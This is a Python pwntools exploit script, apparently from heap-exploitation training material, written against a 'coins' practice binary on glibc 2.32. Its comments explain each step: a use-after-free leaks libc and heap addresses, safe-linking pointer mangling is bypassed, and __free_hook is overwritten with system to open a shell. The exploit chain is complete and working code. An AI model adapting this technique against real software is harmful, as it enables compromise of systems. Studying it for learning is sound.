#!/usr/bin/env python3
'''
Using the ptr mangling mitigations and bypassing them. 

This file has two different solutions: 
- Using heap leak then altering the fd ptr as normal (just with mangling) 
- House of IO 

Eventually, these will be split into two different challenges AND/or IO 
will be removed. But, we'll see! :) 
'''

from pwn import * 
import os
import mangle

mode = 'DEBUG' # Turn on gdb
libc_name = '../../libc_versions/2.32/libc-2.32.so' # For alternate version of libc

env = {}

# Binary setup
elf_name = '.coins-2.32'

elf = ELF(elf_name)
if libc_name != '': 
	libc = ELF(libc_name)
	env = {"LD_PRELOAD": libc.path}
	
# Process creation 
if mode == 'DEBUG': 
	p = process([elf.path],env=env)
	gdb.attach(p) 
else: 
	p = process(elf.path, env=env) 

'''
Selects a coin at a given index 
Parameters: 
	- index: The coin to select 
'''
def select(index): 
	p.sendlineafter(">", "1") 
	p.sendlineafter(":", str(index)) 

''' 
Makes a coin
Parameters: 
	- head: the text for the head of the coin 
	- tail: the text for the tail of the coin 
	- value: the amount the coin is worth
'''
def make(head, tail, value): 
	p.sendlineafter(">", "2") 
	p.sendlineafter(":", str(head))
	p.sendlineafter(":", str(tail)) 
	p.sendlineafter(":", str(value)) 

'''
Makes a coin
'''
def make_tmp(): 
	p.sendlineafter(">", "2") 

'''
Edits a coin -- Assumes the proper coin is already 'selected'
Parameters: 
	- head: the text for the head of the coin 
	- tail: the text for the tail of the coin 
	- value: the amount the coin is worth
'''
def edit(head, tail, value): 
	p.sendlineafter(">", "3") 
	p.sendlineafter(":", str(head)) 
	p.sendlineafter(":", str(tail)) 
	p.sendlineafter(":", str(value)) 

'''
Prints the contents of a coin  -- Assumes the proper coin is already 'selected'
Returns: 
	- Coin: Index 0 is the head, index 1 is the tail and index 2 is 
	        the value. 
'''
def see():
	p.sendlineafter(">", "4") 
	p.recvuntil("Head Design: ") 
	head = p.recvuntil("Tail Design: ").replace("\nTail Design: ", "") 
	tail = p.recvuntil("Worth: ").replace("\nWorth: ", "") 
	value = p.recvuntil("Options").replace("\nOptions","")
	return head, tail, int(value)



''' 
Removes a coin -- Assumes the proper coin is already 'selected'
Parameters: 
	- head: the text for the head of the coin 
	- tail: the text for the tail of the coin 
	- value: the amount the coin is worth
'''
def remove(): 
	p.sendlineafter(">", "5") 

# Uses a LibC leak
# Index 0 has an assumed UAF at this point.
def defeat(libc_base):
	heap_base = heap_leak() # Get a heap leak
	fake_tcache_fd(libc_base, heap_base) # Overwrite the tcache fd pointer
	reg_code_exec() # Use overwritten tcache fd pointer for code execution

# Index 0 has an assumed UAF at this point.
def heap_leak():
	'''
	This is all about getting a heap leak. 
	
	The unsorted bin has TWO entries: fd & bk. The 'tail_desc' ptr is 
	the last item in the unsorted bin. So, the 'fd' ptr of the unsorted 
	bin chunk has a ptr to the heap.
	
	Using the use-after-free (uaf) the 'just deleted' coin can 
	be accessed as if it were a regular coin. The 'tail_desc' pointer
	points to an 'unsorted bin' check whose 'fd' pointers to a 
	'heap' chunk!

	Using this, we can leak the heap to mangle the 'fd' pointers
	later. 
	'''
	heap_offset = 0x22f0 # Offset to get heap base

	# The 'tail' text points to a free unsorted bin chunk. Heap leak
	_, heap_leak, _ = see()
	for char in heap_leak:
		print(hex(ord(char)))

	heap_leak = u64(heap_leak.ljust(8, "\x00"))
	print("Heap Leak: ", hex(heap_leak))

	heap_base = heap_leak - heap_offset
	print("Heap Base: ", hex(heap_base))
	return heap_base

# Set the fake fd of a tcache bin and fix unsorted bin
def fake_tcache_fd(libc_base, heap_base):

	tcache_fd_loc_offset = 0x290 # Location where mangled ptr is stored
	'''
	The fd ptr has to be mangled with the storage location. From 
	using the same allocation series everytime, we know where
	this will be stored at. In a real-world system, you may need
	two leaks in order to know relatively where we are at. 

	The fd ptr is being set to __free_hook so that we can alter 
	the contents at __free_hook to get code execution. We use 
	__free_hook instead of __malloc_hook __malloc_hook is at an 
	offset of 0x8, which is disallowed with tcache in 2.32. 
	The __free_hook also has the benefit of being able to pass
	in a parameter. 

	Alternatively, we could set this chunk to be inside 
	another coin (which we control and can edit). By editing one
	of the pointers on the chunk, this would allow for a VERY nice
	arbitrary write primitive.

	In this case, we are just going to overwrite the __free_hook though.
	'''
	storage_location = heap_base + tcache_fd_loc_offset
	fd_ptr = libc.symbols['__free_hook'] # Use free hook because __malloc_hook is not aligned properly
	
	'''
	Mangling the pointer. View the source code in 'mangle.py' to see
	what is going on here. 

	TODO: Make slides for this and talk more about the mangling
	'''
	mangled_malloc_hook = mangle.encode_ptr(fd_ptr, storage_location)
	print("Free Hook location: ", hex(fd_ptr))
	print("Mangled Free Hook:", hex(mangled_malloc_hook))

	'''
	The use-after-free allows us to edit the current 'fd' pointer. 
	By doing this, we can specify an arbitary chunk to use on 
	a later call to malloc. In better news, this allows an arbitrary 
	

	NOTE: 
	- This fd tcache chunk cannot be the last item in the tcache
	  because tcache keeps a 'count' of how many items are in each bin.
	- We use the __free_hook here because of the alignment chunk that validates
	  that the chunk is 0x10 aligned on 64 bit. 
	'''
	edit("", "", mangled_malloc_hook)

def reg_code_exec():
	'''
	When we enter this function, the tcache looks like the following: 
	0x20: A -> __free_hook

	So, we need to remove the first chunk then use we can allocate 
	over the top of the __free_hook. 
	'''
	make("A", "B", 9) # Remove the 'A' chunk (filler) 


	# Overwrite '__free_hook' with system!
	func = libc.symbols['system'] 
	make("/bin/sh", "like mitigations aren't here", func) 

	'''
	Because we overwrite the '__free_hook', the next call to 
	free will call system.

	The call to 'remove_coin' will free the 'head_desc' field first. 
	Because of this, we put '/bin/sh' into the 'head'. Now, once this
	executes, we call system (instead of free) with '/bin/sh' as the 
	parameter!
	'''
	remove()


def get_libc_leak(): 

	'''
	The vulnerability is a use after free on the currently 
	selected coin, once it has been freed. 
	'''
	# Create 3 coins. Index 0,1,2. 
	make("A" * 8, "B" * 8, 8) 
	make("C" * 8, "D" * 8, 9) 
	make("E" * 8, "F" * 8, 10) 

	# Create a UAF on coin 1 in order to get nice leaks from LibC. 
	select(1) 
	remove() 

	'''
	Returns in the following order: head, tail, coin value. 
	The head points to a useless field but the tail points to 
	a chunk that is in the unsorted bin (from the free). 
	
	Because this is the only entry in the unsorted bin, 
	both the fd and bk fields are pointers to the unsorted_bin 
	itself (aka, a libc ptr). 

	So, we read this to get a LibC leak. 
	'''
	_, libc_leak, heap_managled = see()
	libc_offset = 0x1b2be0
	libc_leak = u64(libc_leak.ljust(8, "\x00"))
	print("LibC Leak: ", hex(libc_leak))

	libc_base = libc_leak - libc_offset
	print("LibC Base: ", hex(libc_base))
	libc.address = libc_base 
	return libc_base

# Get UAF on fd ptr and ability to write to the TCache itself
def edit_fd_uaf(): 
	'''
	There's a UAF on coins only after they have just been deleted
	via the lack of a ptr being cleared. 
	
	There is currently one item in the 0x20 tcache (bin 0). 
	If we free another one, we will have a ptr to the TOP of the 
	bin with the count of the bin being at 2. 

	So, we this allows for a trivial overwrite of the fd ptr and 
	puts 'key' (double free check that points to the beginning of 
	the tcache) in the second slot. 
	'''
	# Create a UAF on coin 0 to leak heap address. 
	select(0) 
	remove()

# Sets LibC as the libc.address in order to just reference the ELF for symbols. 
libc_base = get_libc_leak()
edit_fd_uaf()


defeat(libc_base) 
p.interactive()
